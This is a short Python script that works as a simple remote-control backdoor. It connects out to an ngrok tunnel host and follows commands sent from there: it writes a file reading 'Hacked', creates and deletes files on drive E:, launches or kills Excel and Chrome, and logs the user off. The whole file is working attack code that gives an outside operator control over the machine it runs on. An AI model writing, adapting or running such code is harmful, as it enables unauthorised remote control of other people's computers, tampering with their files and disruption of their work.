import socket
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host='0.tcp.in.ngrok.io'
port=14480
s.connect((host,port))
con=True
while con:
	get_m=s.recv(1024)
	msg=get_m.decode()
	print("\nRececie : "+msg)
	if(msg=="quit"):
		con=False
		s.close()
	elif(msg=="create file"):
		with open("E:\\file1.txt","w")as file:
			file.write("Hacked")
	elif(msg=="delete file"):
		os.remove("E:\\file1.txt")
	elif(msg=="loop create file"):
		for i in range(10):
			with open("E:\\"+str(i+1)+".txt","w")as file:
				file.write("File "+str(i+1))
	elif(msg=="loop delete file"):
		for i in range(10):
			os.remove("E:\\"+str(i+1)+".txt")
	elif(msg=="excel"):
		os.system("start excel")
	elif(msg=="chrome"):
		os.system("start chrome")
	elif(msg=="stop excel"):
		os.system("taskkill /im excel.exe")
	elif(msg=="shut"):
		os.system('shutdown -l')
